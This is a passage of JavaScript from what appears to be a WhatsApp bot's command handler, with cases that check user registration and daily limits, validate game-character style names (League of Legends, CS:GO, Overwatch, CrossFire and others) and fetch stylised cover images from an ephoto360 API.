if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'warface', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['warface-4','warface-3','warface-2','warface','sniper-3','sniper-2','sniper','rifleman','nedic-2','nedic','exosuit','engineer']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'newlolavatar':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('avatar', 'teemo', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('avatar', 'teemo', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['udyr','twitch','twistedfate','trundle','teemo','swain','shyvana','shen','sejuani','renekton','reksai','rammus','zyra','zilean','ziggs','zac','xerath','warwick','vladimir','viktor','vi','velkoz','veigar','vayne','volibear','tristana','taliyah','shaco','leblanc','jinx','graves','fizz','ekko','corki','cassiopeia','caitlyn','blitzcrank','bard','alistar','akali','aatrox','janna','wukong','thresh','taric','talon','ryze','nordekaiser','karma','kalista','irelia','gnar','garen','galio','soraka','sona','sivir','riven','quinn','nocturne','nami','lux','kindred','khazix','katarina','jarvan','fiora','diana','aurelionsol','ashe','ahri','varus','syndra','nidalee','kennen','jhin','zed','yasuo','rengar','lucian','ezreal','azir','annie','leesin','nasteryi','poppy','pantheon','orianna','nasus','norgana','nissfortune','naokai','nalzaha','lulu','lissandra','leona','kled','jayce','jax','illaoi','xayah','rakan','gangplank','naster_yi2','riven2','elise','darius','xayah_rakan','katarina2','nauthilus','hecarim','thresh2','ashe2','xinzhao','tryndamere','syndra-2','sivir-2','lissandra2','karma-2','draven']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Avatar')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, avatar : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'csgocover':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('background', 'famas', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('background', 'famas', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['ump45','tec9','n4a1','xm1014','famas','np9','pp-bizon','p2000','negev','usps','dualberettas','np5','karambit','awpdragonlore','np7','galilar','ak-47','glock','sg-553','ak47','r8revolver','aug','butterflyknife','deserteagle','gsg9','p90asiimov','awphawking','n4a4','sas','awpasiimov','ssg08bitw','sg553ds','r8fade','p90ed','n4a1sdecimator','n4a1howl','karambitds','flipknifemf','awmmedusa','augaa','ak47vulcan','ak47fs']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, background : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coverloknew':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('hero', 'hayate-5', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('hero', 'hayate-5', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['arum-6','baldum-3','elandorr-3','hayate-5','ilumia-5','ishar-4','lauriel-8','nax-5','nurad-9','quillen-5','teemee-3','telannas-6','volkath-3','yena-4','yena-5','butterfly-10','laville','laville-2','nakroth-7','omen-6','rouie-2','taara-4','zanis-8','zata','zata-2','capheny-4','lsu-6','fennik-5','liliana-7','paine','paine-2','rouie','astrid-4','ata','ata-2','lauriel-8','omen-5','qi-3','roxie-5','taara-5','violet-12','wukong-7','wukong-8','hayate-4','ishar-4','jinna-5','kerra-2','lauriel-7','nina-5','quillen-5','richter-4','ryoma-6','telannas-8','tulen-9','yorn-8','aleister-4','dirak','dirak-2','grakk-5','kerra','raz-4','amily-5','athur-7','arum-5','ishar-2','nax-4','natalya-7','valhein-7','zill-5','diaochan-6','ignis-4','lubu-8','naloch-7','sephera-4','elandorr','elandorr-2','krizzix','krizzix-2','violet-11','yena-3','arduin-4','enzo-3','errol-3','hayate-3','krixi-7','nurad-7','volkath','volkath','volkath-2','wisp-4','wukong-6','celica','gildur-4','ishar','nurad-7','quillen-4','tulen-8','lauriel-6','qi','qi-2','darcy','florentino-3','noren-3','ryoma-5','sephera-3','annettte-4','capheny-3','elsu-5','narja-3','vilolet-10','violet-10','zip-2','zip-2a','airi-9','diaochan-5','enzo-2','lubu-7','nganga-4','payna-3','roxie-4','violet-9','zanis-7','zephys-6','enzo','liliana-6','lindis-5','xeniel-5','airi-9','errol-2','yena','yena-2','zuka-8','yorn','violet','zanis','thane','slimz','skud','preyta','payna','nakroth','nina','naloch','illumia','krixi','diaochan','butterfly','veera','valhein','toro','taara','raz','ormarr','nganga','lubu','kriknak','kahlil','grakk','gildur','alice','omega','wukong','natalya','nortos','cresht','airi','aleister','lumburr','zephis','violet-2','jinna','chaugnar','azzenka','valhein-2','zanis-2','skud-2','payna-2','natalya-3','natalya-2','nortos-2','krixi-2','jinna-2','illumia-2','butterfly-3','butterfly-2','yorn-2','taara-2','nakroth-2','lubu2','lauriel','kahlii-2','zuka-2','zuka','batman','airi-2','airi-3','butterfly-4','diaochan-2','grakk-2','ignis','ignis-2','lauriel2','nina-2','nurad','nurad-2','ormarr-2','raz-2','slimz2','violet-3','zill-2','zill','zanis-3','yorn-3','veera-3','veera-2','thane-2','telannas','superman','naloch-2','krixi-3','butterfly-5','violet-5','veera-4','telannas-2','joker','illumia-3','batman-2','arduin-2','arduin','zephis-2','wukong-2','ryoma-2','ryoma','nakroth-3','nganga-2','azzenka-2','astrid-2','astrid','arthur','zanis-4','wukong-3','noren','lubu-4','lauriel-3','lubu-3','chaugnar-2','aleister-2','xeniel','telannas-3','preyta-2','nurad-3','kriknak-2','fennik-2','diaochanlubu','alice-2','noren-2','lubu-5','lauriel-4','kilgroth','gildur-2','fennik-3','zephys-3','xeniel-2','xeniel-2','wonderwoman','supeman-2','slimz-3','natalya-4','krixi-5','krixi-4','zanis-5','yorn-4','wonderwoman-2','violet-4','prayta-3','naloch-3','airi-4','telannas-4','ormarr-4','ormarr-3','nakroth-4','kilgroth-2','kahlii-3','grakk-3','airi-5','natalya-5','fennik-4','valhein-4','teemee-2','teemee','lindis','zuka-3','tulen','toro-2','nina-3','naloch-4','lumburr-2','lindis-2','joker-2','grakk-4','gildur-3','aleister-3','tulen-2','toro-3','taara-3','omen-2','omen','zill-3','telannas-5','athur-2','zuka-4','nakroth-5','nax','liliana','raz-3','liliana-2','nax-2','kriknak-3','joker-3','chaugnar-3','wisp','ryoma-3','batman-3','airi-6','tulen-3','flash','cresht-3','cresht-2','astris-3','arum-2','arum','butterfly-6','lice-3','xeniel-3','valhein-4','tulen-4','rourke-2','rourke','nurad-4','nax-3','wisp-2','narja-2','narja','zuka-5','jinna-3','butterfly-7','arthur-2','violet-6','valhein-5','superman-3','liliana-3','kilgroth-3','diaochan-3','wirosabaleng-3','roxie-2','roxie','wukong-4','baldum-2','baldum','zephys-4','annette-2','annette','telannas-6','raz-4','nurad-6','nurad-5','jinna-4','amily','ybneth-2','ybneth','ilumia-4','amily-2','xeniel-4','veera-5','liliana-4','flash-2','arthur-3','omen-3','lindis-3','elsu-2','elsu','richter-2','richter','nina-4','thane-3','ryoma-4','quillen-2','quillen','lauriel-5','arum-3','wisp-3','violet-7','sephera-2','sephera','naloch-5','krixi-6','alice-4','tulen-5','skud-3','rourke-3','nakroth-6','florentino-2','florentino','elsu-3','butterfly-8','amily-3','zuka-7','zuka-6','yorn-6','yorn-5','veres-2','veres','naloch-6','cresht-4','azzenka-3','airi-7','zephys-5','yorn-7','violet-8','valhein-6','tulen-6','thane-4','roxie-3','nakroth-7','kahlii-4','elsu-4','darcy-2','darcy','capheny','zill-4','hayate-2','hayate','cresht-5','annette-3','amily-4','veera-6','tulen-7','telannas-7','omen-4','lindis-4','liliana-5','ignis-3','errol','capheny-2','arum-4','zanis-6','wukong-5','thane-5','slimz-4','skud-4','richter-3','quillen-3','azzenka-4','arduin-3','airi-8']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Hero')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, hero : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}
	break
	case 'coverfblol':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('letters', 'pantheon', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('letters', 'pantheon', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['yasuo','shen','riven','pantheon','orianna','nocturne','nami','norgana','naster-yi','lux','lucian','katarina','kalista','jinx','jhin','irelia','hecarim','graves','garen','fizz','fiora','ezreal','ekko','diana','darius','cassiopeia','caitlyn','braum','azir','ashe','warwick','thresh','leblanc','khazix','kayn','draven','zyra','zed','xayah','taric','talon','sona','sivir','rengar','rakan','leesin','gnar','elise']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Letters')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, letters : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'overwatchcover':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('hero', 'zwidowmaker', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('hero', 'zwidowmaker', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['zwinston','zjunkrat','zwidowmaker','ztracer','ztorbjorn','zsymmetra','zsombra','zsoldier76','zroadhog','zreinhardt','zreaper','zpharah','zorisa','zmercy','zmei','zmccree','zlucio','zhanzo','zgenji','zenyatta','zdva','zbastion','zarya','zana','yzenyatta','yzarya','ywinston','ywidowmaker','ytracer','ytorbjorn','ysymmetra','ysombra','ysoldier76','yroadhog','yreinhardt','yreaper','ypharah','yorisa','ymercy','ymei','ymccree','ylucio','yjunkrat','yhanzo','ygenji','ydva','ybastion','yana','xzenyatta','xzarya','xwinston','xwidowmaker','xtracer','xtorbjorn','xsymmetra','xsombra','xsoldier76','xroadhog','xreinhardt','xreaper','xpharah','xorisa','xmercy','xmei','xmccree','xlucio','xjunkrat','xhanzo','xgenji','xdva','xbastion','xana','wzenyatta','wzarya','wtracer','wtorbjorn','wsymmetra','wsombra','wsoldier76','wroadhog','wreinhardt','wreaper','wpharah','worisa','wmercy','wmei','wmccree','wlucio','wjunkrat','winston','widowmaker','whanzo','wgenji','wdva','wbastion','wana','vzenyatta','vzarya','vwinston','vwidowmaker','vtracer','vtorbjorn','vsymmetra','vsombra','vsoldier76','vroadhog','vreinhardt','vreaper','vpharah','vorisa','vmercy','vmei','vmccree','vlucio','vjunkrat','vhanzo','vgenji','vdva','vbastion','vana','uzenyatta','uzarya','uwinston','uwidowmaker','utracer','utorbjorn','usymmetra','usombra','usoldier76','uroadhog','ureinhardt','ureaper','upharah','uorisa','umercy','umei','umccree','ulucio','ujunkrat','uhanzo','ugenji','udva','ubastion','uana','tzenyatta','tzarya','twinston','twidowmaker','tsymmetra','tsombra','tsoldier76','troadhog','treinhardt','treaper','tracer','tpharah','torisa','torbjorn','tmercy','tmei','tmccree','tlucio','tjunkrat','thanzo','tgenji','tdva','tbastion','tana','szenyatta','szarya','symmetra','swinston','swidowmaker','stracer','storbjorn','sroadhog','sreinhardt','sreaper','spharah','sorisa','sombra','soldier76','smercy','smei','smccree','slucio','sjunkrat','shanzo','sgenji','sdva','sbastion','sana','rzenyatta','rzarya','rwinston','rwidowmaker','rtracer','rtorbjorn','rsymmetra','rsombra','rsoldier76','rrmei','rpharah','rorisa','roadhog','rmercy','rmccree','rlucio','rjunkrat','rhanzo','rgenji','reinhardt','reaper','rdva','rbastion','rana','qzenyatta','qzarya','qwinston','qwidowmaker','qtracer','qtorbjorn','qsymmetra','qsombra','qsoldier76','qroadhog','qreinhardt','qreaper','qpharah','qorisa','qmercy','qmei','qmccree','qlucio','qjunkrat','qhanzo','qgenji','qdva','qbastion','qana','pzenyatta','pzarya','pwinston','pwidowmaker','ptracer','ptorbjorn','psymmetra','psombra','psoldier76','proadhog','preinhardt','preaper','porisa','pmercy','pmei','pmccree','plucio','pjunkrat','pharah','phanzo','pgenji','pdva','pbastion','pana','ozenyatta','ozarya','owinston','owidowmaker','otracer','otorbjorn','osymmetra','osombra','osoldier76','oroadhog','orisa','oreinhardt','oreaper','opharah','omercy','omei','omccree','olucio','ojunkrat','ohanzo','ogenji','odva','obastion','oana','nzenyatta','nzarya','nwinston','nwidowmaker','ntracer','ntorbjorn','nsymmetra','nsombra','nsoldier76','nroadhog','nreinhardt','nreaper','npharah','norisa','nmercy','nmei','nmccree','nlucio','njunkrat','nhanzo','ngenji','ndva','nbastion','nana','mzenyatta','mzarya','mwinston','mwidowmaker','mtracer','mtorbjorn','msymmetra','msombra','msoldier76','mroadhog','mreinhardt','mreaper','mpharah','morisa','mlucio','mjunkrat','mhanzo','mgenji','mercy','mei','mdva','mccree','mbastion','mana','lzenyatta','lzarya','lwinston','lwidowmaker','lucio','ltracer','ltorbjorn','lsymmetra','lsombra','lsoldier76','lroadhog','lreinhardt','lreaper','lpharah','lorisa','lmercy','lmei','lmccree','ljunkrat','lhanzo','lgenji','ldva','lbastion','lana','kzenyatta','kzarya','kwinston','kwidowmaker','ktracer','ktorbjorn','ksymmetra','ksombra','ksoldier76','kroadhog','kreinhardt','kreaper','kpharah','korisa','kmercy','kmei','kmccree','klucio','kjunkrat','khanzo','kgenji','kdva','kbastion','kana','jzenyatta','jzarya','jwinston','jwidowmaker','junkrat','jtracer','jtorbjorn','jsymmetra','jsombra','jsoldier76','jroadhog','jreinhardt','jreaper','jpharah','jorisa','jmercy','jmei','jmccree','jlucio','jhanzo','jgenji','jdva','jbastion','jana','izenyatta','izarya','iwinston','iwidowmaker','itracer','itorbjorn','isymmetra','isombra','isoldier76','iroadhog','ireinhardt','ireaper','ipharah','iorisa','imercy','imei','imccree','ilucio','ijunkrat','ihanzo','igenji','idva','ibastion','iana','hzenyatta','hzarya','hwinston','hwidowmaker','htracer','htorbjorn','hsymmetra','hsombra','hsoldier76','hroadhog','hreinhardt','hreaper','hpharah','horisa','hmercy','hmei','hmccree','hlucio','hjunkrat','hgenji','hdva','hbastion','hanzo','hana','gzenyatta','gzarya','gwinston','gwidowmaker','gtracer','gtorbjorn','gsymmetra','gsombra','gsoldier76','groadhog','greinhardt','greaper','gpharah','gorisa','gmercy','gmei','gmccree','glucio','gjunkrat','genji','gdva','gbastion','ganafzenyatta','fzarya','fwinston','fwidowmaker','ftracer','ftorbjorn','fsymmetra','fsombra','fsoldier76','froadhog','freinhardt','freaper','fpharah','forisa','fmercy','fmei','fmccree','flucio','fjunkrat','fhanzo','fgenji','fdva','fbastion','fana','ezenyatta','ezarya','ewinston','ewidowmaker','etracer','etorbjorn','esymmetra','esombra','esoldier76','eroadhog','ereinhardt','ereaper','epharah','eorisa','emercy','emei','emccree','elucio','ejunkrat','ehanzo','egenji','edva','ebastion','eana','dzenyatta','dzarya','dwinston','dwidowmaker','dva','dtracer','dtorbjorn','dsymmetra','dsombra','dsoldier76','droadhog','dreinhardt','dreaper','dpharah','dorisa','dmercy','dmei','dmccree','dlucio','djunkrat','dhanzo','dgenji','dbastion','dana','czenyatta','czarya','cwinston','cwidowmaker','ctracer','ctorbjorn','csymmetra','csombra','csoldier76','croadhog','creinhardt','creaper','cpharah','corisa','cmercy','cmei','cmccree','clucio','cjunkrat','chanzo','cgenji','cdva','cbastion','cana','bzenyatta','bzarya','bwinston','bwidowmaker','btracer','btorbjorn','bsymmetra','bsombra','bsoldier76','broadhog','breinhardt','breaper','bpharah','borisa','bmercy','bmei','bmccree','blucio','bjunkrat','bhanzo','bgenji','bdva','bastion','bana','azenyatta','azarya','awinston','awidowmaker','atracer','atorbjorn','asymmetra','asombra','asoldier76','aroadhog','areinhardt','areaper','apharah','aorisa','ana','amercy','amei','amccree','alucio','ajunkrat','ahanzo','agenji','adva','abastion','zdoomfist','ydoomfist','xdoomfist','wdoomfist','vdoomfist','udoomfist','tdoomfist','sdoomfist','rdoomfist','qdoomfist','pdoomfist','odoomfist','ndoomfist','mdoomfist','ldoomfist','kdoomfist','jdoomfist','idoomfist','hdoomfist','gdoomfist','fdoomfist','edoomfist','doomfist','cdoomfist','bdoomfist','adoomfist']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Hero')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, hero : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'crossfirestyle':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('avatar', 'switcher', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('avatar', 'switcher', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['spop','switcher','switcher-2','switcher-3 ','thefates','thefates-2','thefates-3','swat','fox','star','omoh','sabel','sas','sia','navy-seals','jtf','jns','laswat','sraf','shadow','nemesis','nocha','ixions','gsg-9','ghosty','hermes','foxu','dh','angelapt','ac']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Avatar')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, avatar : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'avatarlolbyname':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('style', 'katarina-0', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'katarina-0', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['katarina-0','zyra-4','zyra-3','zyra-2','zyra-1','zyra-0','zilean-5','zilean-4','zilean-3','zilean-2','zilean-1','zilean-0','ziggs-5','ziggs-4','ziggs-3','ziggs-2','ziggs-1','ziggs-0','zed-3','zed-2','zed-10','zed-1','zed-0','zac-2','zac-1','zac-0','yorick-2','yorick-1','yorick-0','yasuo-4','yasuo-3','yasuo-2','yasuo-1','yasuo-0','xinzhao-6','xinzhao-13','xinzhao-5','xinzhao-4','xinzhao-3','xinzhao-2','xinzhao-1','xinzhao-0','xerath-4','xerath-3','xerath-2','xerath-1','xerath-0','xayah-1','xayah-0','warwick-8','warwick-7','warwick-6','warwick-5','warwick-4','warwick-3','warwick-2','warwick-1','warwick-0','volibear-5','volibear-4','volibear-3','volibear-2','volibear-1','volibear-0','vladimir-7','vladimir-6','vladimir-5','vladimir-4','vladimir-3','vladimir-2','vladimir-1','vladimir-0','viktor-2','viktor-1','viktor-0','vi-5','vi-4','vi-3','vi-2','vi-1','vi-0','velkoz-3','velkoz-2','velkoz-1','velkoz-0','veigar-8','veigar-7','veigar-6','veigar-5','veigar-4','veigar-3','veigar-2','veigar-1','veigar-0','vayne-6','vayne-5','vayne-4','vayne-3','vayne-2','vayne-1','vayne-0','vayne-10','varus-6','varus-5','varus-4','varus-3','varus-2','varus-1','varus-0','urgot-3','urgot-2','urgot-1','urgot-0','udyr-4','udyr-3','udyr-2','udyr-1','udyr-0','twitch-7','twitch-6','twitch-5','twitch-4','twitch-3','twitch-2','twitch-1','twitch-0','twistedfate-9','twistedfate-10','twistedfate-8','twistedfate-7','twistedfate-6','twistedfate-5','twistedfate-4','twistedfate-3','twistedfate-2','twistedfate-1','twistedfate-0','tryndamere-9','tryndamere-8','tryndamere-7','tryndamere-6','tryndamere-5','tryndamere-4','tryndamere-3','tryndamere-2','tryndamere-1','tryndamere-0','trundle-5','trundle-4','trundle-3','trundle-2','trundle-1','trundle-0','tristana-6','tristana-5','tristana-4','tristana-3','tristana-2','tristana-1','tristana-0','tristana-10','tristana-11','thresh-5','thresh-4','thresh-3','thresh-2','thresh-1','thresh-0','teemo-8','teemo-7','teemo-6','teemo-5','teemo-4','teemo-3','teemo-2','teemo-1','teemo-0','teemo-14','taric-4','taric-3','taric-2','taric-1','taric-0','talon-5','talon-4','talon-3','talon-2','talon-1','talon-0','taliyah-1','taliyah-0','tahmkench-2','tahmkench-1','tahmkench-0','syndra-4','syndra-3','syndra-2','syndra-1','syndra-0','swain-3','swain-2','swain-1','swain-0','soraka-6','soraka-5','soraka-4','soraka-3','soraka-2','soraka-1','soraka-0','sona-6','sona-5','sona-4','sona-3','sona-2','sona-1','sona-0','skarner-4','skarner-3','skarner-2','skarner-1','skarner-0','sivir-7','sivir-6','sivir-5','sivir-4','sivir-3','sivir-2','sivir-1','sivir-0','sion-5','sion-4','sion-3','sion-2','sion-1','sion-0','singed-8','singed-7','singed-6','singed-5','singed-4','singed-3','singed-2','singed-1','singed-0','shyvana-6','shyvana-5','shyvana-4','shyvana-3','shyvana-3','shyvana-2','shyvana-1','shyvana-0','shen-6','shen-5','shen-4','shen-3','shen-2','shen-1','shen-0','shaco-7','shaco-6','shaco-5','shaco-4','shaco-3','shaco-2','shaco-1','shaco-0','sejuani-7','sejuani-6','sejuani-5','sejuani-4','sejuani-3','sejuani-2','sejuani-1','sejuani-0','ryze-10','ryze-9','ryze-8','ryze-7','ryze-6','ryze-5','ryze-4','ryze-3','ryze-2','ryze-1','ryze-0','rumble-3','rumble-2','rumble-1','rumble-0','riven-8','riven-7','riven-6','riven-5','riven-4','riven-3','riven-2','riven-1','riven-0','rengar-3','rengar-2','rengar-1','rengar-0','renekton-9','renekton-8','renekton-7','renekton-6','renekton-5','renekton-4','renekton-3','renekton-2','renekton-1','renekton-0','reksai-1','reksai-2','reksai-0','rammus-7','rammus-6','rammus-5','rammus-4','rammus-3','rammus-2','rammus-1','rammus-0','rakan-1','rakan-0','quinn-4','quinn-3','quinn-2','quinn-1','quinn-0','poppy-7','poppy-6','poppy-5','poppy-4','poppy-3','poppy-2','poppy-1','poppy-0','pantheon-8','pantheon-7','pantheon-6','pantheon-5','pantheon-4','pantheon-3','pantheon-2','pantheon-1','pantheon-0','orianna-7','orianna-6','orianna-5','orianna-4','orianna-3','orianna-2','orianna-1','orianna-0','olaf-6','olaf-5','olaf-4','olaf-3','olaf-2','olaf-1','olaf-0','nunu-7','nunu-6','nunu-5','nunu-4','nunu-3','nunu-2','nunu-1','nunu-0','nocturne-6','nocturne-5','nocturne-4','nocturne-3','nocturne-2','nocturne-1','nocturne-0','nidalee-8','nidalee-7','nidalee-6','nidalee-5','nidalee-4','nidalee-3','nidalee-2','nidalee-1','nidalee-0','nautilus-5','nautilus-4','nautilus-3','nautilus-2','nautilus-1','nautilus-0','nasus-6','nasus-5','nasus-4','nasus-3','nasus-2','nasus-1','nasus-0','nasus-10','nami-7','nami-6','nami-5','nami-4','nami-3','nami-2','nami-1','nami-0','norgana-6','norgana-5','norgana-4','norgana-3','norgana-2','norgana-1','norgana-0','norgana-10','norgana-11','nordekaiser-4','nordekaiser-3','nordekaiser-2','nordekaiser-1','nordekaiser-0','nonkeyking-5','nonkeyking-4','nonkeyking-3','nonkeykin